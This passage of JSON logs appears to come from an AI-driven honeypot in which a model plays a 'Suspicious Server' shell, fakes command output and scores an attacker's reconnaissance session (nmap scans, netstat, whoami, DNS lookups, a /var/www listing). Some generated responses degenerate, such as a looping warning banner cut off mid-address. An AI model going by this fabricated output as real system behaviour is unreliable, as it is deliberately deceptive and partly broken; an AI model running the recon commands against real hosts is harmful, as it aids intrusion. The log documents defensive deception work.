    "response": "1  corp-internal-secure (10.0.2.15)  0.144 ms  0.144 ms  0.144 ms\n 2  * * *\n 3  * * *\n 4  * * *\n 5  * * *\n 6  * * *\n 7  * * *\n 8  * * *\n 9  * * *\n10  * * *\n11  * * *\n12  * * *\n13  * * *\n14  * * *\n15  * * *\n16  * * *\n17  * * *\n18  * * *\n19  * * *\n20  * * *\n21  * * *\n22  * * *\n23  * * *\n24  * * *\n25  * * *\n26  * * *\n27  * * *\n28  * * *\n29  * * *\n30  * * *\n\nWARNING: Potential security risk detected. Unusual network activity from this host.",
    "selected_personality": {
        "name": "Suspicious Server",
        "hostname": "corp-internal-secure",
        "user": "sysadmin",
        "style": "suspicious",
        "description": "Cautious, alert, prints occasional warning banners",
        "response_style": "cautious, alert, prints occasional warning banners or security notices, returns slightly defensive output"
    },
    "threat_score": {
        "score": 51,
        "risk_level": "HIGH",
        "final_score": 51,
        "threat_level": "HIGH",
        "base_score": 51,
        "multiplier": 1.0,
        "severity_indicator": "\ud83d\udfe0"
    },
    "attacker_profile": {
        "curiosity": {
            "commands_executed": 22,
            "unique_commands": 19,
            "directories_visited": 1,
            "recon_commands": 7,
            "persistence_attempts": 0,
            "curiosity_score": 100
        },
        "engagement": {
            "session_duration": 210,
            "commands_executed": 22,
            "successful_commands": 22,
            "failed_commands": 0,
            "files_accessed": 0,
            "services_accessed": 0,
            "engagement_score": 70,
            "engagement_level": "MEDIUM"
        },
        "behaviour": {
            "Curiosity Score": 100,
            "Persistence Score": "LOW",
            "Interaction Depth": "HIGH",
            "Risk Score": 51,
            "Session Complexity": "HIGH"
        },
        "commands": [
            "nmap -sS -v 192.168.1.1",
            "nmap -p 80,443 target.org",
            "nmap -p 80,443 target.org",
            "nmap -sS -v 192.168.1.1",
            "nmap -p 80,443 target.org",
            "whoami",
            "id",
            "uname -a",
            "hostname",
            "uptime",
            "lscpu",
            "lsb_release -a",
            "w",
            "last -n 5",
            "netstat",
            "netstat -antp",
            "netstat -tulpn",
            "ss -tulpn",
            "ifconfig eth0",
            "ip addr show",
            "ping -c 4 8.8.8.8",
            "traceroute 8.8.8.8"
        ],
        "confidence_score": 0.99
    }
}
2026-07-21 11:10:11,197 - {"session_id": "71dd20b2", "command": "traceroute 8.8.8.8", "attack_type": "Reconnaissance", "risk_score": 51, "threat_level": "HIGH"}
2026-07-21 11:10:11,197 - {
    "session_id": "71dd20b2",
    "command": "traceroute 8.8.8.8",
    "ai_decision": "1  corp-internal-secure (10.0.2.15)  0.144 ms  0.144 ms  0.144 ms\n 2  * * *\n 3  * * *\n 4  * * *\n 5  * * *\n 6  * * *\n 7  * * *\n 8  * * *\n 9  * * *\n10  * * *\n11  * * *\n12  * * *\n13  * * *\n14  * * *\n15  * * *\n16  * * *\n17  * * *\n18  * * *\n19  * * *\n20  * * *\n21  * * *\n22  * * *\n23  * * *\n24  * * *\n25  * * *\n26  * * *\n27  * * *\n28  * * *\n29  * * *\n30  * * *\n\nWARNING: Potential security risk detected. Unusual network activity from this host.",
    "confidence_score": 0.85,
    "conversation_metadata": {
        "conversation_id": "71dd20b2",
        "interaction_count": 22
    },
    "prediction_result": {
        "next_prediction": "Privilege Escalation",
        "prediction_confidence": 0.85
    },
    "risk_score": 51,
    "threat_level": "HIGH"
}
2026-07-21 11:10:11,197 - {
    "session_id": "71dd20b2",
    "conversation_log": "Attacker executed: traceroute 8.8.8.8",
    "ai_decision": "1  corp-internal-secure (10.0.2.15)  0.144 ms  0.144 ms  0.144 ms\n 2  * * *\n 3  * * *\n 4  * * *\n 5  * * *\n 6  * * *\n 7  * * *\n 8  * * *\n 9  * * *\n10  * * *\n11  * * *\n12  * * *\n13  * * *\n14  * * *\n15  * * *\n16  * * *\n17  * * *\n18  * * *\n19  * * *\n20  * * *\n21  * * *\n22  * * *\n23  * * *\n24  * * *\n25  * * *\n26  * * *\n27  * * *\n28  * * *\n29  * * *\n30  * * *\n\nWARNING: Potential security risk detected. Unusual network activity from this host.",
    "session_metadata": {
        "prediction": "Privilege Escalation"
    },
    "system_event": "AI Deception Generated",
    "security_event": "Reconnaissance",
    "warning": "High Threat Level",
    "error": null
}
2026-07-21 11:10:25,428 - {
    "session_id": "71dd20b2",
    "query": "dig example.com",
    "response": "**WARNING: Potential Security Risk Detected**\n\n**dig example.com**\n\n; <<>> DiG 9.16.1-Ubuntu <<>> example.com\n;; global options: +cmd\n;; Got answer:\n;; ->>HEADER<<- opcode: QUERY, status: NXDOMAIN, id: 1234\n;; flags: qr rd ra; QUERY: 1, ANSWER: 0, AUTHORITY: 0, ADDITIONAL: 0\n\n;; QUESTION SECTION:\n;example.com.        IN  A\n\n;; AUTHORITY SECTION:\n\n;; Query time: 1 msec\n;; SERVER: 127.0.0.53#53(127.0.0.53)\n;; WHEN: Wed Jul  6 14:30:00 UTC 2022\n;; MSG SIZE  rcvd: 24\n\n**SECURITY NOTICE: Unrecognized domain queried. Please verify the domain name and ensure it is not a phishing attempt.**",
    "selected_personality": {
        "name": "Suspicious Server",
        "hostname": "corp-internal-secure",
        "user": "sysadmin",
        "style": "suspicious",
        "description": "Cautious, alert, prints occasional warning banners",
        "response_style": "cautious, alert, prints occasional warning banners or security notices, returns slightly defensive output"
    },
    "threat_score": {
        "score": 52,
        "risk_level": "HIGH",
        "final_score": 52,
        "threat_level": "HIGH",
        "base_score": 52,
        "multiplier": 1.0,
        "severity_indicator": "\ud83d\udfe0"
    },
    "attacker_profile": {
        "curiosity": {
            "commands_executed": 23,
            "unique_commands": 20,
            "directories_visited": 1,
            "recon_commands": 7,
            "persistence_attempts": 0,
            "curiosity_score": 100
        },
        "engagement": {
            "session_duration": 227,
            "commands_executed": 23,
            "successful_commands": 23,
            "failed_commands": 0,
            "files_accessed": 0,
            "services_accessed": 0,
            "engagement_score": 70,
            "engagement_level": "MEDIUM"
        },
        "behaviour": {
            "Curiosity Score": 100,
            "Persistence Score": "LOW",
            "Interaction Depth": "HIGH",
            "Risk Score": 52,
            "Session Complexity": "HIGH"
        },
        "commands": [
            "nmap -sS -v 192.168.1.1",
            "nmap -p 80,443 target.org",
            "nmap -p 80,443 target.org",
            "nmap -sS -v 192.168.1.1",
            "nmap -p 80,443 target.org",
            "whoami",
            "id",
            "uname -a",
            "hostname",
            "uptime",
            "lscpu",
            "lsb_release -a",
            "w",
            "last -n 5",
            "netstat",
            "netstat -antp",
            "netstat -tulpn",
            "ss -tulpn",
            "ifconfig eth0",
            "ip addr show",
            "ping -c 4 8.8.8.8",
            "traceroute 8.8.8.8",
            "dig example.com"
        ],
        "confidence_score": 0.99
    }
}
2026-07-21 11:10:25,428 - {"session_id": "71dd20b2", "command": "dig example.com", "attack_type": "Unknown", "risk_score": 52, "threat_level": "HIGH"}
2026-07-21 11:10:25,428 - {
    "session_id": "71dd20b2",
    "command": "dig example.com",
    "ai_decision": "**WARNING: Potential Security Risk Detected**\n\n**dig example.com**\n\n; <<>> DiG 9.16.1-Ubuntu <<>> example.com\n;; global options: +cmd\n;; Got answer:\n;; ->>HEADER<<- opcode: QUERY, status: NXDOMAIN, id: 1234\n;; flags: qr rd ra; QUERY: 1, ANSWER: 0, AUTHORITY: 0, ADDITIONAL: 0\n\n;; QUESTION SECTION:\n;example.com.        IN  A\n\n;; AUTHORITY SECTION:\n\n;; Query time: 1 msec\n;; SERVER: 127.0.0.53#53(127.0.0.53)\n;; WHEN: Wed Jul  6 14:30:00 UTC 2022\n;; MSG SIZE  rcvd: 24\n\n**SECURITY NOTICE: Unrecognized domain queried. Please verify the domain name and ensure it is not a phishing attempt.**",
    "confidence_score": 0.5,
    "conversation_metadata": {
        "conversation_id": "71dd20b2",
        "interaction_count": 23
    },
    "prediction_result": {
        "next_prediction": "Privilege Escalation",
        "prediction_confidence": 0.5
    },
    "risk_score": 52,
    "threat_level": "HIGH"
}
2026-07-21 11:10:25,428 - {
    "session_id": "71dd20b2",
    "conversation_log": "Attacker executed: dig example.com",
    "ai_decision": "**WARNING: Potential Security Risk Detected**\n\n**dig example.com**\n\n; <<>> DiG 9.16.1-Ubuntu <<>> example.com\n;; global options: +cmd\n;; Got answer:\n;; ->>HEADER<<- opcode: QUERY, status: NXDOMAIN, id: 1234\n;; flags: qr rd ra; QUERY: 1, ANSWER: 0, AUTHORITY: 0, ADDITIONAL: 0\n\n;; QUESTION SECTION:\n;example.com.        IN  A\n\n;; AUTHORITY SECTION:\n\n;; Query time: 1 msec\n;; SERVER: 127.0.0.53#53(127.0.0.53)\n;; WHEN: Wed Jul  6 14:30:00 UTC 2022\n;; MSG SIZE  rcvd: 24\n\n**SECURITY NOTICE: Unrecognized domain queried. Please verify the domain name and ensure it is not a phishing attempt.**",
    "session_metadata": {
        "prediction": "Privilege Escalation"
    },
    "system_event": "AI Deception Generated",
    "security_event": "Unknown",
    "warning": "High Threat Level",
    "error": null
}
2026-07-21 11:10:40,783 - {
    "session_id": "71dd20b2",
    "query": "nslookup target.org",
    "response": "**Warning: Unusual DNS query detected**\n\n**nslookup target.org**\n\nserver can't find target.org: NXDOMAIN\n\n**Security Notice: Unrecognized domain queried. Please verify the target domain.**",
    "selected_personality": {
        "name": "Suspicious Server",
        "hostname": "corp-internal-secure",
        "user": "sysadmin",
        "style": "suspicious",
        "description": "Cautious, alert, prints occasional warning banners",
        "response_style": "cautious, alert, prints occasional warning banners or security notices, returns slightly defensive output"
    },
    "threat_score": {
        "score": 53,
        "risk_level": "HIGH",
        "final_score": 53,
        "threat_level": "HIGH",
        "base_score": 53,
        "multiplier": 1.0,
        "severity_indicator": "\ud83d\udfe0"
    },
    "attacker_profile": {
        "curiosity": {
            "commands_executed": 24,
            "unique_commands": 21,
            "directories_visited": 1,
            "recon_commands": 7,
            "persistence_attempts": 0,
            "curiosity_score": 100
        },
        "engagement": {
            "session_duration": 241,
            "commands_executed": 24,
            "successful_commands": 24,
            "failed_commands": 0,
            "files_accessed": 0,
            "services_accessed": 0,
            "engagement_score": 70,
            "engagement_level": "MEDIUM"
        },
        "behaviour": {
            "Curiosity Score": 100,
            "Persistence Score": "LOW",
            "Interaction Depth": "HIGH",
            "Risk Score": 53,
            "Session Complexity": "HIGH"
        },
        "commands": [
            "nmap -sS -v 192.168.1.1",
            "nmap -p 80,443 target.org",
            "nmap -p 80,443 target.org",
            "nmap -sS -v 192.168.1.1",
            "nmap -p 80,443 target.org",
            "whoami",
            "id",
            "uname -a",
            "hostname",
            "uptime",
            "lscpu",
            "lsb_release -a",
            "w",
            "last -n 5",
            "netstat",
            "netstat -antp",
            "netstat -tulpn",
            "ss -tulpn",
            "ifconfig eth0",
            "ip addr show",
            "ping -c 4 8.8.8.8",
            "traceroute 8.8.8.8",
            "dig example.com",
            "nslookup target.org"
        ],
        "confidence_score": 0.99
    }
}
2026-07-21 11:10:40,783 - {"session_id": "71dd20b2", "command": "nslookup target.org", "attack_type": "Unknown", "risk_score": 53, "threat_level": "HIGH"}
2026-07-21 11:10:40,783 - {
    "session_id": "71dd20b2",
    "command": "nslookup target.org",
    "ai_decision": "**Warning: Unusual DNS query detected**\n\n**nslookup target.org**\n\nserver can't find target.org: NXDOMAIN\n\n**Security Notice: Unrecognized domain queried. Please verify the target domain.**",
    "confidence_score": 0.5,
    "conversation_metadata": {
        "conversation_id": "71dd20b2",
        "interaction_count": 24
    },
    "prediction_result": {
        "next_prediction": "Privilege Escalation",
        "prediction_confidence": 0.5
    },
    "risk_score": 53,
    "threat_level": "HIGH"
}
2026-07-21 11:10:40,783 - {
    "session_id": "71dd20b2",
    "conversation_log": "Attacker executed: nslookup target.org",
    "ai_decision": "**Warning: Unusual DNS query detected**\n\n**nslookup target.org**\n\nserver can't find target.org: NXDOMAIN\n\n**Security Notice: Unrecognized domain queried. Please verify the target domain.**",
    "session_metadata": {
        "prediction": "Privilege Escalation"
    },
    "system_event": "AI Deception Generated",
    "security_event": "Unknown",
    "warning": "High Threat Level",
    "error": null
}
2026-07-21 11:10:56,974 - {
    "session_id": "71dd20b2",
    "query": "host target.org",
    "response": "**WARNING: Potential Security Risk Ahead**\n\n**Connecting to target.org...**\n\n**WARNING: Untrusted Host Ahead**\n\n**Connecting to target.org (IP address: 93.184.216.34)**\n\n**WARNING: Potential DNS Spoofing Risk**\n\n**Connecting to target.org (IP address: 93.184.216.34)**\n\n**WARNING: Untrusted Certificate Ahead**\n\n**Connecting to target.org (IP address: 93.184.216.34)**\n\n**WARNING: Potential Man-in-the-Middle Attack**\n\n**Connecting to target.org (IP address: 93.184.216.34)**\n\n**WARNING: Untrusted Host Ahead**\n\n**Connecting to target.org (IP address: 93.184.216.34)**\n\n**WARNING: Potential DNS Spoofing Risk**\n\n**Connecting to target.org (IP address: 93.184.216.34)**\n\n**WARNING: Untrusted Certificate Ahead**\n\n**Connecting to target.org (IP address: 93.184.216.34)**\n\n**WARNING: Potential Man-in-the-Middle Attack**\n\n**Connecting to target.org (IP address: 93.184.216.34)**\n\n**WARNING: Untrusted Host Ahead**\n\n**Connecting to target.org (IP address: 93.184.216.34)**\n\n**WARNING: Potential DNS Spoofing Risk**\n\n**Connecting to target.org (IP address: 93.184.216.34)**\n\n**WARNING: Untrusted Certificate Ahead**\n\n**Connecting to target.org (IP address: 93.184.216.34)**\n\n**WARNING: Potential Man-in-the-Middle Attack**\n\n**Connecting to target.org (IP address: 93.184.216.34)**\n\n**WARNING: Untrusted Host Ahead**\n\n**Connecting to target.org (IP address: 93.184.216.34)**\n\n**WARNING: Potential DNS Spoofing Risk**\n\n**Connecting to target.org (IP address: 93.184.216.34)**\n\n**WARNING: Untrusted Certificate Ahead**\n\n**Connecting to target.org (IP address: 93.184.216.34)**\n\n**WARNING: Potential Man-in-the-Middle Attack**\n\n**Connecting to target.org (IP address: 93.184.216.34)**\n\n**WARNING: Untrusted Host Ahead**\n\n**Connecting to target.org (IP address: 93.184.216.34)**\n\n**WARNING: Potential DNS Spoofing Risk**\n\n**Connecting to target.org (IP address: 93.184.216.34)**\n\n**WARNING: Untrusted Certificate Ahead**\n\n**Connecting to target.org (IP address: 93.184.216.34)**\n\n**WARNING: Potential Man-in-the-Middle Attack**\n\n**Connecting to target.org (IP address: 93.184.216.34)**\n\n**WARNING: Untrusted Host Ahead**\n\n**Connecting to target.org (IP address: 93.184.216.34)**\n\n**WARNING: Potential DNS Spoofing Risk**\n\n**Connecting to target.org (IP address: 93.184.216.34)**\n\n**WARNING: Untrusted Certificate Ahead**\n\n**Connecting to target.org (IP address: 93.184.216.34)**\n\n**WARNING: Potential Man-in-the-Middle Attack**\n\n**Connecting to target.org (IP address: 93.184.216.34)**\n\n**WARNING: Untrusted Host Ahead**\n\n**Connecting to target.org (IP address: 93.184.216.34)**\n\n**WARNING: Potential DNS Spoofing Risk**\n\n**Connecting to target.org (IP address: 93.184.216.34)**\n\n**WARNING: Untrusted Certificate Ahead**\n\n**Connecting to target.org (IP address: 93.184.216.34)**\n\n**WARNING: Potential Man-in-the-Middle Attack**\n\n**Connecting to target.org (IP address: 93.184.216.34)**\n\n**WARNING: Untrusted Host Ahead**\n\n**Connecting to target.org (IP address: 93.184.216.34)**\n\n**WARNING: Potential DNS Spoofing Risk**\n\n**Connecting to target.org (IP address: 93.184.216.34)**\n\n**WARNING: Untrusted Certificate Ahead**\n\n**Connecting to target.org (IP address: 93.184.216.34)**\n\n**WARNING: Potential Man-in-the-Middle Attack**\n\n**Connecting to target.org (IP address: 93.184.216.34)**\n\n**WARNING: Untrusted Host Ahead**\n\n**Connecting to target.org (IP address: 93.184.216.34)**\n\n**WARNING: Potential DNS Spoofing Risk**\n\n**Connecting to target.org (IP address: 93.184.216.34)**\n\n**WARNING: Untrusted Certificate Ahead**\n\n**Connecting to target.org (IP address: 93.184.216.34)**\n\n**WARNING: Potential Man-in-the-Middle Attack**\n\n**Connecting to target.org (IP address: 93",
    "selected_personality": {
        "name": "Suspicious Server",
        "hostname": "corp-internal-secure",
        "user": "sysadmin",
        "style": "suspicious",
        "description": "Cautious, alert, prints occasional warning banners",
        "response_style": "cautious, alert, prints occasional warning banners or security notices, returns slightly defensive output"
    },
    "threat_score": {
        "score": 54,
        "risk_level": "HIGH",
        "final_score": 54,
        "threat_level": "HIGH",
        "base_score": 54,
        "multiplier": 1.0,
        "severity_indicator": "\ud83d\udfe0"
    },
    "attacker_profile": {
        "curiosity": {
            "commands_executed": 25,
            "unique_commands": 22,
            "directories_visited": 1,
            "recon_commands": 7,
            "persistence_attempts": 0,
            "curiosity_score": 100
        },
        "engagement": {
            "session_duration": 257,
            "commands_executed": 25,
            "successful_commands": 25,
            "failed_commands": 0,
            "files_accessed": 0,
            "services_accessed": 0,
            "engagement_score": 70,
            "engagement_level": "MEDIUM"
        },
        "behaviour": {
            "Curiosity Score": 100,
            "Persistence Score": "LOW",
            "Interaction Depth": "HIGH",
            "Risk Score": 54,
            "Session Complexity": "HIGH"
        },
        "commands": [
            "nmap -sS -v 192.168.1.1",
            "nmap -p 80,443 target.org",
            "nmap -p 80,443 target.org",
            "nmap -sS -v 192.168.1.1",
            "nmap -p 80,443 target.org",
            "whoami",
            "id",
            "uname -a",
            "hostname",
            "uptime",
            "lscpu",
            "lsb_release -a",
            "w",
            "last -n 5",
            "netstat",
            "netstat -antp",
            "netstat -tulpn",
            "ss -tulpn",
            "ifconfig eth0",
            "ip addr show",
            "ping -c 4 8.8.8.8",
            "traceroute 8.8.8.8",
            "dig example.com",
            "nslookup target.org",
            "host target.org"
        ],
        "confidence_score": 0.99
    }
}
2026-07-21 11:10:56,974 - {"session_id": "71dd20b2", "command": "host target.org", "attack_type": "Unknown", "risk_score": 54, "threat_level": "HIGH"}
2026-07-21 11:10:56,974 - {
    "session_id": "71dd20b2",
    "command": "host target.org",
    "ai_decision": "**WARNING: Potential Security Risk Ahead**\n\n**Connecting to target.org...**\n\n**WARNING: Untrusted Host Ahead**\n\n**Connecting to target.org (IP address: 93.184.216.34)**\n\n**WARNING: Potential DNS Spoofing Risk**\n\n**Connecting to target.org (IP address: 93.184.216.34)**\n\n**WARNING: Untrusted Certificate Ahead**\n\n**Connecting to target.org (IP address: 93.184.216.34)**\n\n**WARNING: Potential Man-in-the-Middle Attack**\n\n**Connecting to target.org (IP address: 93.184.216.34)**\n\n**WARNING: Untrusted Host Ahead**\n\n**Connecting to target.org (IP address: 93.184.216.34)**\n\n**WARNING: Potential DNS Spoofing Risk**\n\n**Connecting to target.org (IP address: 93.184.216.34)**\n\n**WARNING: Untrusted Certificate Ahead**\n\n**Connecting to target.org (IP address: 93.184.216.34)**\n\n**WARNING: Potential Man-in-the-Middle Attack**\n\n**Connecting to target.org (IP address: 93.184.216.34)**\n\n**WARNING: Untrusted Host Ahead**\n\n**Connecting to target.org (IP address: 93.184.216.34)**\n\n**WARNING: Potential DNS Spoofing Risk**\n\n**Connecting to target.org (IP address: 93.184.216.34)**\n\n**WARNING: Untrusted Certificate Ahead**\n\n**Connecting to target.org (IP address: 93.184.216.34)**\n\n**WARNING: Potential Man-in-the-Middle Attack**\n\n**Connecting to target.org (IP address: 93.184.216.34)**\n\n**WARNING: Untrusted Host Ahead**\n\n**Connecting to target.org (IP address: 93.184.216.34)**\n\n**WARNING: Potential DNS Spoofing Risk**\n\n**Connecting to target.org (IP address: 93.184.216.34)**\n\n**WARNING: Untrusted Certificate Ahead**\n\n**Connecting to target.org (IP address: 93.184.216.34)**\n\n**WARNING: Potential Man-in-the-Middle Attack**\n\n**Connecting to target.org (IP address: 93.184.216.34)**\n\n**WARNING: Untrusted Host Ahead**\n\n**Connecting to target.org (IP address: 93.184.216.34)**\n\n**WARNING: Potential DNS Spoofing Risk**\n\n**Connecting to target.org (IP address: 93.184.216.34)**\n\n**WARNING: Untrusted Certificate Ahead**\n\n**Connecting to target.org (IP address: 93.184.216.34)**\n\n**WARNING: Potential Man-in-the-Middle Attack**\n\n**Connecting to target.org (IP address: 93.184.216.34)**\n\n**WARNING: Untrusted Host Ahead**\n\n**Connecting to target.org (IP address: 93.184.216.34)**\n\n**WARNING: Potential DNS Spoofing Risk**\n\n**Connecting to target.org (IP address: 93.184.216.34)**\n\n**WARNING: Untrusted Certificate Ahead**\n\n**Connecting to target.org (IP address: 93.184.216.34)**\n\n**WARNING: Potential Man-in-the-Middle Attack**\n\n**Connecting to target.org (IP address: 93.184.216.34)**\n\n**WARNING: Untrusted Host Ahead**\n\n**Connecting to target.org (IP address: 93.184.216.34)**\n\n**WARNING: Potential DNS Spoofing Risk**\n\n**Connecting to target.org (IP address: 93.184.216.34)**\n\n**WARNING: Untrusted Certificate Ahead**\n\n**Connecting to target.org (IP address: 93.184.216.34)**\n\n**WARNING: Potential Man-in-the-Middle Attack**\n\n**Connecting to target.org (IP address: 93.184.216.34)**\n\n**WARNING: Untrusted Host Ahead**\n\n**Connecting to target.org (IP address: 93.184.216.34)**\n\n**WARNING: Potential DNS Spoofing Risk**\n\n**Connecting to target.org (IP address: 93.184.216.34)**\n\n**WARNING: Untrusted Certificate Ahead**\n\n**Connecting to target.org (IP address: 93.184.216.34)**\n\n**WARNING: Potential Man-in-the-Middle Attack**\n\n**Connecting to target.org (IP address: 93.184.216.34)**\n\n**WARNING: Untrusted Host Ahead**\n\n**Connecting to target.org (IP address: 93.184.216.34)**\n\n**WARNING: Potential DNS Spoofing Risk**\n\n**Connecting to target.org (IP address: 93.184.216.34)**\n\n**WARNING: Untrusted Certificate Ahead**\n\n**Connecting to target.org (IP address: 93.184.216.34)**\n\n**WARNING: Potential Man-in-the-Middle Attack**\n\n**Connecting to target.org (IP address: 93",
    "confidence_score": 0.5,
    "conversation_metadata": {
        "conversation_id": "71dd20b2",
        "interaction_count": 25
    },
    "prediction_result": {
        "next_prediction": "Privilege Escalation",
        "prediction_confidence": 0.5
    },
    "risk_score": 54,
    "threat_level": "HIGH"
}
2026-07-21 11:10:56,974 - {
    "session_id": "71dd20b2",
    "conversation_log": "Attacker executed: host target.org",
    "ai_decision": "**WARNING: Potential Security Risk Ahead**\n\n**Connecting to target.org...**\n\n**WARNING: Untrusted Host Ahead**\n\n**Connecting to target.org (IP address: 93.184.216.34)**\n\n**WARNING: Potential DNS Spoofing Risk**\n\n**Connecting to target.org (IP address: 93.184.216.34)**\n\n**WARNING: Untrusted Certificate Ahead**\n\n**Connecting to target.org (IP address: 93.184.216.34)**\n\n**WARNING: Potential Man-in-the-Middle Attack**\n\n**Connecting to target.org (IP address: 93.184.216.34)**\n\n**WARNING: Untrusted Host Ahead**\n\n**Connecting to target.org (IP address: 93.184.216.34)**\n\n**WARNING: Potential DNS Spoofing Risk**\n\n**Connecting to target.org (IP address: 93.184.216.34)**\n\n**WARNING: Untrusted Certificate Ahead**\n\n**Connecting to target.org (IP address: 93.184.216.34)**\n\n**WARNING: Potential Man-in-the-Middle Attack**\n\n**Connecting to target.org (IP address: 93.184.216.34)**\n\n**WARNING: Untrusted Host Ahead**\n\n**Connecting to target.org (IP address: 93.184.216.34)**\n\n**WARNING: Potential DNS Spoofing Risk**\n\n**Connecting to target.org (IP address: 93.184.216.34)**\n\n**WARNING: Untrusted Certificate Ahead**\n\n**Connecting to target.org (IP address: 93.184.216.34)**\n\n**WARNING: Potential Man-in-the-Middle Attack**\n\n**Connecting to target.org (IP address: 93.184.216.34)**\n\n**WARNING: Untrusted Host Ahead**\n\n**Connecting to target.org (IP address: 93.184.216.34)**\n\n**WARNING: Potential DNS Spoofing Risk**\n\n**Connecting to target.org (IP address: 93.184.216.34)**\n\n**WARNING: Untrusted Certificate Ahead**\n\n**Connecting to target.org (IP address: 93.184.216.34)**\n\n**WARNING: Potential Man-in-the-Middle Attack**\n\n**Connecting to target.org (IP address: 93.184.216.34)**\n\n**WARNING: Untrusted Host Ahead**\n\n**Connecting to target.org (IP address: 93.184.216.34)**\n\n**WARNING: Potential DNS Spoofing Risk**\n\n**Connecting to target.org (IP address: 93.184.216.34)**\n\n**WARNING: Untrusted Certificate Ahead**\n\n**Connecting to target.org (IP address: 93.184.216.34)**\n\n**WARNING: Potential Man-in-the-Middle Attack**\n\n**Connecting to target.org (IP address: 93.184.216.34)**\n\n**WARNING: Untrusted Host Ahead**\n\n**Connecting to target.org (IP address: 93.184.216.34)**\n\n**WARNING: Potential DNS Spoofing Risk**\n\n**Connecting to target.org (IP address: 93.184.216.34)**\n\n**WARNING: Untrusted Certificate Ahead**\n\n**Connecting to target.org (IP address: 93.184.216.34)**\n\n**WARNING: Potential Man-in-the-Middle Attack**\n\n**Connecting to target.org (IP address: 93.184.216.34)**\n\n**WARNING: Untrusted Host Ahead**\n\n**Connecting to target.org (IP address: 93.184.216.34)**\n\n**WARNING: Potential DNS Spoofing Risk**\n\n**Connecting to target.org (IP address: 93.184.216.34)**\n\n**WARNING: Untrusted Certificate Ahead**\n\n**Connecting to target.org (IP address: 93.184.216.34)**\n\n**WARNING: Potential Man-in-the-Middle Attack**\n\n**Connecting to target.org (IP address: 93.184.216.34)**\n\n**WARNING: Untrusted Host Ahead**\n\n**Connecting to target.org (IP address: 93.184.216.34)**\n\n**WARNING: Potential DNS Spoofing Risk**\n\n**Connecting to target.org (IP address: 93.184.216.34)**\n\n**WARNING: Untrusted Certificate Ahead**\n\n**Connecting to target.org (IP address: 93.184.216.34)**\n\n**WARNING: Potential Man-in-the-Middle Attack**\n\n**Connecting to target.org (IP address: 93.184.216.34)**\n\n**WARNING: Untrusted Host Ahead**\n\n**Connecting to target.org (IP address: 93.184.216.34)**\n\n**WARNING: Potential DNS Spoofing Risk**\n\n**Connecting to target.org (IP address: 93.184.216.34)**\n\n**WARNING: Untrusted Certificate Ahead**\n\n**Connecting to target.org (IP address: 93.184.216.34)**\n\n**WARNING: Potential Man-in-the-Middle Attack**\n\n**Connecting to target.org (IP address: 93",
    "session_metadata": {
        "prediction": "Privilege Escalation"
    },
    "system_event": "AI Deception Generated",
    "security_event": "Unknown",
    "warning": "High Threat Level",
    "error": null
}
2026-07-21 11:11:22,645 - {
    "session_id": "71dd20b2",
    "query": "pwd",
    "response": "/home/ubuntu",
    "selected_personality": {
        "name": "Suspicious Server",
        "hostname": "corp-internal-secure",
        "user": "sysadmin",
        "style": "suspicious",
        "description": "Cautious, alert, prints occasional warning banners",
        "response_style": "cautious, alert, prints occasional warning banners or security notices, returns slightly defensive output"
    },
    "threat_score": {
        "score": 55,
        "risk_level": "HIGH",
        "final_score": 55,
        "threat_level": "HIGH",
        "base_score": 55,
        "multiplier": 1.0,
        "severity_indicator": "\ud83d\udfe0"
    },
    "attacker_profile": {
        "curiosity": {
            "commands_executed": 26,
            "unique_commands": 23,
            "directories_visited": 1,
            "recon_commands": 7,
            "persistence_attempts": 0,
            "curiosity_score": 100
        },
        "engagement": {
            "session_duration": 273,
            "commands_executed": 26,
            "successful_commands": 26,
            "failed_commands": 0,
            "files_accessed": 0,
            "services_accessed": 0,
            "engagement_score": 70,
            "engagement_level": "MEDIUM"
        },
        "behaviour": {
            "Curiosity Score": 100,
            "Persistence Score": "LOW",
            "Interaction Depth": "HIGH",
            "Risk Score": 55,
            "Session Complexity": "HIGH"
        },
        "commands": [
            "nmap -sS -v 192.168.1.1",
            "nmap -p 80,443 target.org",
            "nmap -p 80,443 target.org",
            "nmap -sS -v 192.168.1.1",
            "nmap -p 80,443 target.org",
            "whoami",
            "id",
            "uname -a",
            "hostname",
            "uptime",
            "lscpu",
            "lsb_release -a",
            "w",
            "last -n 5",
            "netstat",
            "netstat -antp",
            "netstat -tulpn",
            "ss -tulpn",
            "ifconfig eth0",
            "ip addr show",
            "ping -c 4 8.8.8.8",
            "traceroute 8.8.8.8",
            "dig example.com",
            "nslookup target.org",
            "host target.org",
            "pwd"
        ],
        "confidence_score": 0.99
    }
}
2026-07-21 11:11:22,645 - {"session_id": "71dd20b2", "command": "pwd", "attack_type": "Unknown", "risk_score": 55, "threat_level": "HIGH"}
2026-07-21 11:11:22,645 - {
    "session_id": "71dd20b2",
    "command": "pwd",
    "ai_decision": "/home/ubuntu",
    "confidence_score": 0.5,
    "conversation_metadata": {
        "conversation_id": "71dd20b2",
        "interaction_count": 26
    },
    "prediction_result": {
        "next_prediction": "Privilege Escalation",
        "prediction_confidence": 0.5
    },
    "risk_score": 55,
    "threat_level": "HIGH"
}
2026-07-21 11:11:22,645 - {
    "session_id": "71dd20b2",
    "conversation_log": "Attacker executed: pwd",
    "ai_decision": "/home/ubuntu",
    "session_metadata": {
        "prediction": "Privilege Escalation"
    },
    "system_event": "AI Deception Generated",
    "security_event": "Unknown",
    "warning": "High Threat Level",
    "error": null
}
2026-07-21 11:11:36,232 - {
    "session_id": "71dd20b2",
    "query": "ls -la /var/www",
    "response": "**WARNING: Accessing sensitive directory /var/www**\n\ndrwxr-xr-x  2 root root 4096 Jun 15 14:30 .\ndrwxr-xr-x 19 root root 4096 Jun 15 14:30 ..\n-rw-r--r--  1 root root  220 Jun 15 14:30 clients.json\n-rw-r--r--  1 root root  220 Jun 15 14:30 vendors.json\n-rw-r--r--  1 root root  220 Jun 15 14:30 infrastructure_assets.yaml\n-rw-r--r--  1 root root  220 Jun 15 14:30 db_backup.sql\n-rw-r--r--  1 root root  220 Jun 15 14:30 dev_tasks.md\ndrwxr-xr-x  2 root root 4096 Jun 15 14:30 internal\ndrwxr-xr-x  2 root root 4096 Jun 15 14:30 html\ndrwxr-xr-x  2 root root 4096 Jun 15 14:30 uploads\n**SECURITY NOTICE: Be cautious when accessing sensitive data in /var/www**",
    "selected_personality": {
        "name": "Suspicious Server",
        "hostname": "corp-internal-secure",
        "user": "sysadmin",
        "style": "suspicious",
        "description": "Cautious, alert, prints occasional warning banners",
        "response_style": "cautious, alert, prints occasional warning banners or security notices, returns slightly defensive output"
    },
    "threat_score": {
        "score": 59,
        "risk_level": "HIGH",
        "final_score": 59,
